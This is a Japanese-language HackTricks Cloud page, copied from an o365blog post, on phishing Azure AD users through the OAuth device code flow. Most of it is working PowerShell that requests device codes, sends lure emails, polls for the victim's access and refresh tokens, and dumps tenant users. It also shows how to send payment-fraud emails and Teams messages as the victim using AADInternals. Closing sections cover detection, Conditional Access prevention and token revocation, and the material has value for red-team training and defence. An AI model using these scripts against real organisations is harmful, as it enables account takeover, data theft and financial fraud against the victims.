# Az - デバイスコード認証フィッシング

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**最新版のPEASSやHackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見する
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するために、PRを提出して** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のgithubリポジトリに参加してください。**

</details>

**この投稿は** [**https://o365blog.com/post/phishing/**](https://o365blog.com/post/phishing/) **からコピーされました。**

### デバイスコード認証とは <a href="#what-is-device-code-authentication" id="what-is-device-code-authentication"></a>

Microsoftの[ドキュメント](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code)によると、デバイスコード認証は次のように定義されています。

> ユーザーは、スマートテレビ、IoTデバイス、プリンターなどの入力制約のあるデバイスにサインインできるようにするためのものです。このフローを有効にするために、デバイスはユーザーに別のデバイスのブラウザでウェブページにサインインするように依頼します。ユーザーがサインインすると、デバイスは必要に応じてアクセストークンとリフレッシュトークンを取得できるようになります。

プロセスは次のようになります。

1. ユーザーはデバイス上でデバイスコードフローをサポートするアプリを起動します。
2. アプリはAzure ADの/devicecodeエンドポイントに接続し、**client\_id**と**resource**を送信します。
3. Azure ADは**device\_code**、**user\_code**、および**verification\_url**を返します。
4. デバイスは**verification\_url** (hxxps://microsoft.com/devicelogin) と**user\_code**をユーザーに表示します。
5. ユーザーはブラウザを開き、**verification\_url**にアクセスし、要求された場合に**user\_code**を入力してログインします。
6. デバイスはAzure ADをポーリングし、ログインが成功すると**access\_token**と**refresh\_token**を取得します。

![デバイスコードフロー](https://o365blog.com/images/posts/phishing\_5.png)

### デバイスコード認証を利用したフィッシング <a href="#phishing-with-device-code-authentication" id="phishing-with-device-code-authentication"></a>

デバイスコード認証をフィッシングに利用する基本的なアイデアは次のとおりです。

1. 攻撃者は/devicecodeエンドポイントに接続し、**client\_id**と**resource**を送信します。
2. **verification\_uri**と**user\_code**を受け取った後、**verification\_uri**と**user\_code**へのリンクを含むメールを作成し、被害者に送信します。
3. 被害者がリンクをクリックし、コードを提供してサインインを完了します。
4. 攻撃者は**access\_token**と**refresh\_token**を受け取り、被害者を模倣することができます。

#### 1. /devicecodeエンドポイントへの接続 <a href="#1-connecting-to-devicecode-endpoint" id="1-connecting-to-devicecode-endpoint"></a>

最初のステップは、Azure ADのdevicecodeエンドポイントに対してHTTP POSTを行うことです：
```
https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0
```
私は以下のパラメータを使用しています。私は「Microsoft Office」のclient\_idを使用することを選びました。これは最も信頼性のあるアプリ名のように見えますし、他のリソースにもアクセスできます。選択したリソースは、MSOnline PowerShellモジュールで使用されるAAD Graph APIへのアクセスを提供します。

| パラメータ  | 値                                                   |
| ---------- | ------------------------------------------------------- |
| client\_id | d3590ed6-52b3-4102-aeff-aad2292ab01c                    |
| resource   | [https://graph.windows.net](https://graph.windows.net/) |

レスポンスは以下のようになります：
```json
{
"user_code": "CLZ8HAV2L",
"device_code": "CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t_ZM2B0cgcjQgAA",
"verification_url": "https://microsoft.com/devicelogin",
"expires_in": "900",
"interval": "5",
"message": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code CLZ8HAV2L to authenticate."
}
```
| パラメーター       | 説明                                                                 |
| ----------------- | --------------------------------------------------------------------------- |
| user\_code        | ユーザーが要求されたときに入力するコード                                   |
| device\_code      | 認証結果を「ポーリング」するために使用されるデバイスコード                    |
| verification\_url | ユーザーが認証のためにブラウズする必要のあるURL                         |
| expires\_in       | 有効期限の時間（15分）                                 |
| interval          | クライアントが認証のためにポーリングする頻度（秒単位） |
| message           | ユーザーに表示するための事前フォーマットされたメッセージ                            |

以下はdeviceloginエンドポイントに接続するためのスクリプトです：
```powershell
# Create a body, we'll be using client id of "Microsoft Office"

$body=@{
"client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"resource" =  "https://graph.windows.net"
}

# Invoke the request to get device and user codes

$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
$user_code =    $authResponse.user_code
```
**注意！** 私はバージョン1.0を使用しており、[ドキュメント](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code)で使用されているv2.0フローとは少し異なります。

#### 2. フィッシングメールの作成 <a href="#2-creating-a-phishing-email" id="2-creating-a-phishing-email"></a>

今、私たちは**verification\_url**（常に同じ）と**user\_code**を持っているので、フィッシングメールを作成して送信することができます。

**注意！** メールを送信するには、動作するSMTPサービスが必要です。

以下は、被害者にフィッシングメールを送信するためのスクリプトです：
```powershell
# Create a message

$message = @"
<html>
Hi!<br>
Here is the link to the <a href="https://microsoft.com/devicelogin">document</a>. Use the following code to access: <b>$user_code</b>. <br><br>
</html>
"@

# Send the email

Send-MailMessage -from "Don Director <dond@something.com>" -to "william.victim@target.org" -Subject "Don shared a document with you" -Body $message -SmtpServer $SMTPServer -BodyAsHtml
```
受け取ったメールは次のようになります：![デバイスコードフロー](https://o365blog.com/images/posts/phishing\_6.png)

#### 3. 「魚を釣る」- ターゲットが認証を実行する <a href="#3-catching-the-fish-victim-performs-the-authentication" id="3-catching-the-fish-victim-performs-the-authentication"></a>

ターゲットがリンクをクリックすると、次のサイトが表示されます。URLは正規のMicrosoftのURLであることがわかります。ユーザーはメールからのコードを入力するように求められます。

![デバイスコード](https://o365blog.com/images/posts/phishing\_7.png)

コードを入力した後、ユーザーはサインインするユーザーを選択するように求められます。ユーザーは**Microsoft Office**にサインインするように求められます - 同意は求められません。

**注意！**ユーザーがログインしていない場合、ターゲット組織が使用している方法でログインする必要があります。

![ログイン](https://o365blog.com/images/posts/phishing\_8.png)

認証が成功した後、ユーザーには次のように表示されます。

![利益](https://o365blog.com/images/posts/phishing\_9.png)

:warning: **この時点でユーザーの身元が危険にさらされています！** :warning:

#### 4. アクセストークンの取得 <a href="#4-retrieving-the-access-tokens" id="4-retrieving-the-access-tokens"></a>

攻撃者の最後のステップは、アクセストークンを取得することです。ステップ2を完了した後、攻撃者はAzure ADに対して認証の状態をポーリングし始めます。

攻撃者は、5秒ごとにAzure ADのトークンエンドポイントに対してHTTP POSTを行う必要があります：
```
https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0
```
以下のパラメータを含むリクエストが必要です（codeはステップ1のdevice_codeです）

| パラメータ   | 値                                                                                                                                                                                                            |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| client\_id  | d3590ed6-52b3-4102-aeff-aad2292ab01c                                                                                                                                                                             |
| resource    | [https://graph.windows.net](https://graph.windows.net/)                                                                                                                                                          |
| code        | CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t\_ZM2B0cgcjQgAA |
| grant\_type | urn:ietf:params:oauth:grant-type:device\_code                                                                                                                                                                    |

認証が保留中の場合、以下のコンテンツとともにhttpエラー**400 Bad Request**が返されます：
```json
{
"error": "authorization_pending",
"error_description": "AADSTS70016: OAuth 2.0 device flow error. Authorization is pending. Continue polling.\r\nTrace ID: b35f261e-93cd-473b-9cf9-b81f30800600\r\nCorrelation ID: 8ee0ae8a-533f-4742-8334-e9ed939b083d\r\nTimestamp: 2020-10-14 06:06:07Z",
"error_codes": [70016],
"timestamp": "2020-10-13 18:06:07Z",
"trace_id": "b35f261e-93cd-473b-9cf9-b81f30800600",
"correlation_id": "8ee0ae8a-533f-4742-8334-e9ed939b083d",
"error_uri": "https://login.microsoftonline.com/error?code=70016"
}
```
ログインに成功した後、以下の応答を受け取ります（トークンは切り詰められます）：
```json
{
"token_type": "Bearer",
"scope": "user_impersonation",
"expires_in": "7199",
"ext_expires_in": "7199",
"expires_on": "1602662787",
"not_before": "1602655287",
"resource": "https://graph.windows.net",
"access_token": "eyJ0eXAi...HQOT1rvUEOEHLeQ",
"refresh_token": "0.AAAAxkwD...WxPoK0Iq6W",
"foci": "1",
"id_token": "eyJ0eXAi...widmVyIjoiMS4wIn0."
}
```
以下のスクリプトは、Azure ADトークンエンドポイントに接続し、認証の状態をポーリングします。
```powershell
$continue = $true
$interval = $authResponse.interval
$expires =  $authResponse.expires_in

# Create body for authentication requests

$body=@{
"client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
"code" =       $authResponse.device_code
"resource" =   "https://graph.windows.net"
}

# Loop while authorisation is pending or until timeout exceeded

while($continue)
{
Start-Sleep -Seconds $interval
$total += $interval

if($total -gt $expires)
{
Write-Error "Timeout occurred"
return
}

# Try to get the response. Will give 40x while pending so we need to try&catch

try
{
$response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
}
catch
{
# This is normal flow, always returns 40x unless successful

$details=$_.ErrorDetails.Message | ConvertFrom-Json
$continue = $details.error -eq "authorization_pending"
Write-Host $details.error

if(!$continue)
{
# Not pending so this is a real error

Write-Error $details.error_description
return
}
}

# If we got response, all okay!

if($response)
{
break # Exit the loop

}
}
```
いまや、アクセストークンを使用して被害者をなりすますことができます。
```powershell
# Dump the tenant users to csv

Get-AADIntUsers -AccessToken $response.access_token | Export-Csv users.csv
```
他のサービスへのアクセストークンも、クライアント\_idが同じである限り、リフレッシュトークンを使用して取得することができます。

以下のスクリプトは、Exchange Onlineのアクセストークンを取得します。
```powershell
# Create body for getting access token for Exchange Online

$body=@{
"client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" =    "refresh_token"
"scope" =         "openid"
"resource" =      "https://outlook.office365.com"
"refresh_token" = $response.refresh_token
}

$EXOresponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body $body -ErrorAction SilentlyContinue

# Send email as the victim

Send-AADIntOutlookMessage -AccessToken $EXOresponse.access_token -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
## フィッシングにAADInternalsを使用する <a href="#using-aadinternals-for-phishing" id="using-aadinternals-for-phishing"></a>

AADInternals（v0.4.4以降）には、フィッシングプロセスを自動化する[Invoke-AADIntPhishing](https://o365blog.com/aadinternals/#invoke-aadintphishing)関数があります。

フィッシングメッセージはカスタマイズ可能で、デフォルトのメッセージは以下の通りです：
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/><br/>Here is a <a href="{1}">link</a> you <b>should not click</b>.<br/><br/>If you still decide to do so, provide the following code when requested: <b>{0}</b>.</div>'
```
デフォルトのメールのメッセージ:\
![フィッシングメール](https://o365blog.com/images/posts/phishing\_11.png)

デフォルトのTeamsのメッセージ:\
![フィッシングメッセージ](https://o365blog.com/images/posts/phishing\_12.png)

### メール <a href="#email" id="email"></a>

以下の例では、カスタマイズされたメッセージを使用してフィッシングメールを送信します。トークンはキャッシュに保存されます。
```powershell
# Create a custom message

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'

# Send a phishing email to recipients using a customised message and save the tokens to cache

Invoke-AADPhishing -Recipients "wvictim@company.com","wvictim2@company.com" -Subject "Johnny shared a document with you" -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local -Message $message -SaveToCache
```

```
Code: CKDZ2BURF
Mail sent to: wvictim@company.com
...
Received access token for william.victim@company.com
```
そして、キャッシュされたトークンを使用して、被害者としてメールを送信することができます。
```powershell
# Send email as the victim

Send-AADIntOutlookMessage -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
より緊急な支払い要求をするために、Teamsメッセージを送信することもできます:
```powershell
# Send Teams message as the victim

Send-AADIntTeamsMessage -Recipients "another.wictim@target.org" -Message "Just sent you an email about due payment. Have a look at it."
```

```
Sent                MessageID
----                ---------
16/10/2020 14.40.23 132473328207053858
```
**以下のビデオは、メールフィッシングにAADInternalsを使用する方法を示しています。**

### Teams <a href="#teams" id="teams"></a>

AADInternalsは、Teamsのチャットメッセージとしてフィッシングメッセージを送信することができます。

**注意！** ターゲットが「認証」を行い、トークンが受け取られた後、AADInternalsは元のメッセージを置き換えます。このメッセージは、-CleanMessageパラメータで指定することができます。

デフォルトのクリーンメッセージは次のとおりです：
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/>If you are seeing this, <b>someone has stolen your identity!</b>.</div>'
```
![Teams clean message](https://o365blog.com/images/posts/phishing\_13.png)

以下の例では、カスタマイズされたメッセージを使用してフィッシングメールを送信します。トークンはキャッシュに保存されます。
```powershell
# Get access token for Azure Core Management

Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Create the custom messages

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'
$cleanMessage = '<html>Hi!<br/>Have a nice weekend.</html>'

# Send a teams message to the recipient using customised messages

Invoke-AADPhishing -Recipients "wvictim@company.com" -Teams -Message $message -CleanMessage $cleanMessage -SaveToCache
```

```
Code: CKDZ2BURF
Teams message sent to: wvictim@company.com. Message id: 132473151989090816
...
Received access token for william.victim@company.com
```
**以下のビデオは、TeamsフィッシングにAADInternalsを使用する方法を示しています。**

## 検出 <a href="#detecting" id="detecting"></a>

まず、Azure ADの観点からは、ログインは**開始された**認証が行われた場所で行われます。これは非常に重要なポイントです。つまり、サインインログでは、ログインはユーザーではなく、**攻撃者の場所とデバイス**から行われました。

ただし、リフレッシュトークンを使用して取得したアクセストークンは、サインインログには表示されません。

以下は、私がAzure VM（具体的には[クラウドシェル](https://o365blog.com/post/cloudshell/)）からフィッシングを開始した例です。私たちは、"Microsoft Office"クライアントを使用して7:23 AMにログインしたことが、IPアドレス51.144.240.233から行われたことを確認できます。ただし、7:27 AMにExchange Onlineのアクセストークンを取得したことはログに表示されません。

![Azure ADサインインログ](https://o365blog.com/images/posts/phishing\_10.png)

:warning: ユーザーが非典型的な場所からサインインしているという兆候がある場合、ユーザーアカウントは侵害されている可能性があります。

## 予防 <a href="#preventing" id="preventing"></a>

この技術を使用したフィッシングを防ぐための唯一の効果的な方法は、[条件付きアクセス](https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview)（CA）ポリシーを使用することです。具体的には、**フィッシングを防ぐことはできません**が、特定のルールに基づいて**ユーザーのサインインを防ぐ**ことができます。特に、場所とデバイスの状態に基づくポリシーは、アカウントを保護するために効果的です。これは現在使用されているすべてのフィッシング技術に適用されます。

ただし、すべてのシナリオをカバーすることはできません。たとえば、不正な場所からのログインに対してMFAを強制することは、ユーザーがMFAを使用してログインしている場合には役に立ちません。

## 緩和 <a href="#mitigating" id="mitigating"></a>

ユーザーが侵害された場合、ユーザーのリフレッシュトークンは[取り消すことができます](https://docs.microsoft.com/en-us/powershell/module/azuread/revoke-azureaduserallrefreshtoken?view=azureadps-2.0)。これにより、攻撃者は侵害されたリフレッシュトークンで新しいアクセストークンを取得することができなくなります。

## 要約 <a href="#summary" id="summary"></a>

私の知る限り、デバイスコード認証フローの技術は以前にフィッシングに使用されていません。

攻撃者の観点から見ると、この方法にはいくつかの利点があります：

* 任意のアプリを登録する必要はありません
* 偽のログインページなどのフィッシングインフラをセットアップする必要はありません
* ユーザーにはサインインのみを求められます（通常は「Microsoft Office」に対して）- 同意は求められません
* すべては**login.microsoftonline.com**の名前空間で行われます
* 攻撃者は任意のclient\_idとリソースを使用できます（ただし、すべての組み合わせが機能するわけではありません）
* ユーザーがMFAを使用してサインインした場合、アクセストークンにもMFAのクレームが含まれます（これにはリフレッシュトークンを使用して取得したアクセストークンも含まれます）
* 予防には条件付きアクセス（およびAzure AD Premium P1/P2ライセンス）が必要です

攻撃者の観点から見ると、この方法には少なくとも1つのデメリットがあります：

* ユーザーコードは15分間のみ有効です

もちろん、攻撃者は複数の受信者にフィッシングメールを送信することで時間制限を最小限に抑えることができます-これにより、誰かがコードを使用してサインインする可能性が高まります。

別の方法は、リンクがクリックされたときに認証を開始する[プロキシ](https://gist.github.com/Mr-Un1k0d3r/afef5a80cb72dfeaa78d14465fb0d333)を実装することです（[@MrUn1k0d3r](https://twitter.com/MrUn1k0d3r)にクレジットがあります）。ただし、この方法では、正規のmicrosoft.comのURLを使用する利点が失われます。

フィッシングキャンペーンを生き残るためのチェックリスト：

1. 情報セキュリティとフィッシングについての**ユーザー教育** :woman\_teacher:
2. マルチファクタ認証（MFA）の使用 :iphone:
3. Intune :hammer\_and\_wrench: と条件付きアクセス（CA） :stop\_sign:

\






<details>

<summary><strong>ハックトリックをサポートして特典を受け取る！</strong></summary>

* HackTricksで**会社を宣伝**したい場合や、**PEASSの最新バージョンを入手**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見しましょう
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**を**フォロー**してください。**
* **ハッキングのトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>
